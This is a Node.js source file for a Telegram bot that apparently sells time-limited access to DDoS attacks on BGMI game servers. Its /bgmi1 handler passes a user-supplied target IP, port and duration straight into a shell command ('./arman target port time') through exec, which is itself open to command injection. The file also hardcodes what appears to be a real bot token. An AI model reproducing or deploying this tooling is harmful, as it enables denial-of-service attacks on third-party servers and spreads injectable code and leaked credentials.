const TelegramBot = require('node-telegram-bot-api');
const moment = require('moment');
const fs = require('fs');
const exec = require('child_process').exec;

// Token for your Telegram bot (replace with your bot's token)
const token = '7718086094:AAEJFB-X5rzMYLmpgxNCfdl-w7qDkfQOBt0';
const bot = new TelegramBot(token, {polling: true});

// Store for cooldowns, approved users, and logs
let bgmiCooldown = {};
let allowedUserIds = [];
let userAccess = {}; // { user_id: { duration, expiration } }
let adminId = '7858368373';  // Admin user ID (can approve/reject users)

// Helper function to log commands
function logCommand(user_id, target, port, time) {
    console.log(`User ${user_id} ran BGMI with target ${target}, port ${port}, and time ${time}`);
}

// Helper function to start attack (simulated)
function startAttackReply(message, target, port, time) {
    bot.sendMessage(message.chat.id, `Attack started on ${target}:${port} for ${time} seconds.`);
}

// Handler for the /bgmi1 command
bot.onText(/\/bgmi1 (.+)/, (message, match) => {
    const user_id = message.from.id.toString();
    const command = match[1].split(" ");
    const target = command[0];
    const port = parseInt(command[1]);
    const time = parseInt(command[2]);

    if (allowedUserIds.includes(user_id)) {
        if (userAccess[user_id] && moment().isBefore(userAccess[user_id].expiration)) {
            if (user_id in bgmiCooldown && (moment().diff(bgmiCooldown[user_id], 'seconds') < 0)) {
                const response = "Cooldown is still active. Please wait before trying again.";
                bot.sendMessage(message.chat.id, response);
                return;
            }
            bgmiCooldown[user_id] = moment(); // Update cooldown time

            if (time > 501) {
                bot.sendMessage(message.chat.id, "Error: Time interval must be less than 500.");
            } else {
                logCommand(user_id, target, port, time);
                startAttackReply(message, target, port, time);

                const fullCommand = `./arman ${target} ${port} ${time}`;
                exec(fullCommand, (err, stdout, stderr) => {
                    if (err) {
                        bot.sendMessage(message.chat.id, `Error executing attack: ${stderr}`);
                        return;
                    }
                    bot.sendMessage(message.chat.id, `BGMI Attack Finished. Target: ${target}, Port: ${port}, Time: ${time}`);
                });
            }
        } else {
            bot.sendMessage(message.chat.id, "You don't have access or your access has expired.");
        }
    } else {
        bot.sendMessage(message.chat.id, "❌ You are not authorized to use this command ❌.");
    }
});

// Command to add users to the allowed list
bot.onText(/\/add (\d+) (day|week)/, (message, match) => {
    const user_id = message.from.id.toString();
    if (user_id === adminId) {
        const target_user_id = match[1];
        const duration = match[2];
        const expiration = moment().add(duration, 'days');

        userAccess[target_user_id] = { duration: duration, expiration: expiration };
        allowedUserIds.push(target_user_id);
        bot.sendMessage(message.chat.id, `User ${target_user_id} has been granted access for ${duration}.`);
    } else {
        bot.sendMessage(message.chat.id, "❌ You are not authorized to add users ❌.");
    }
});

// Command to remove users from the allowed list
bot.onText(/\/remove (\d+)/, (message, match) => {
    const user_id = message.from.id.toString();
    if (user_id === adminId) {
        const target_user_id = match[1];
        const index = allowedUserIds.indexOf(target_user_id);

        if (index > -1) {
            allowedUserIds.splice(index, 1);
            delete userAccess[target_user_id];
            bot.sendMessage(message.chat.id, `User ${target_user_id} has been removed from the allowed list.`);
        } else {
            bot.sendMessage(message.chat.id, "User not found in the allowed list.");
        }
    } else {
        bot.sendMessage(message.chat.id, "❌ You are not authorized to remove users ❌.");
    }
});
